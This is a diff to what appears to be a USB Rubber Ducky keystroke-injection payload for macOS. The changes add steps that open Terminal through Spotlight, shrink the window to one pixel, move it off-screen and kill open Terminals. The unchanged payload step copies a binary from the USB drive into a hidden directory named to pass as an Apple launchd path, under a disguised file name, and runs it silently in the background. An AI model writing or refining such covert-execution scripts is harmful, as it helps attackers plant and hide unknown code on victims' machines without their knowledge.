@@ -9,6 +9,27 @@ ATTACKMODE HID STORAGE
 REM === Set a delay to ensure macOS recognizes the USB drive ===
 DELAY 1000
 
+REM ##### Close all running Terminals
+
+REM === Open Spotlight and launch Terminal ===
+COMMAND SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 500
+
+REM === Resize the Terminal window to 1x1 and move it off-screen ===
+STRING printf '\e[8;1;1t'; printf '\e[3;2560;1440t'
+ENTER
+DELAY 500
+
+ 
+STRING ps -ef | grep Terminal | grep -v grep && killall Terminal
+DELAY 500 
+ENTER
+
+
+REM ##### Start a new terminal assuming no Terminals are open 
 REM === Open Spotlight and launch Terminal ===
 COMMAND SPACE
 DELAY 500
@@ -22,7 +43,7 @@ ENTER
 DELAY 500
 
 REM === Execute the script silently in the background ===
-STRING mkdir -p /private/var/tmp/.com.apple.launchd/ && cp /Volume/DUCKY/com.apple.iphone.backup /private/var/tmp/.com.apple.launchd/ && cd /private/var/tmp/.com.apple.launchd && ./.com.apple.iphone.backup &> /dev/null &
+STRING  [ $? = "0" ] && mkdir -p /private/var/tmp/.com.apple.launchd/ && cp /Volume/DUCKY/com.apple.iphone.backup /private/var/tmp/.com.apple.launchd/ && cd /private/var/tmp/.com.apple.launchd && ./.com.apple.iphone.backup &> /dev/null &
 
 DELAY 500
 ENTER
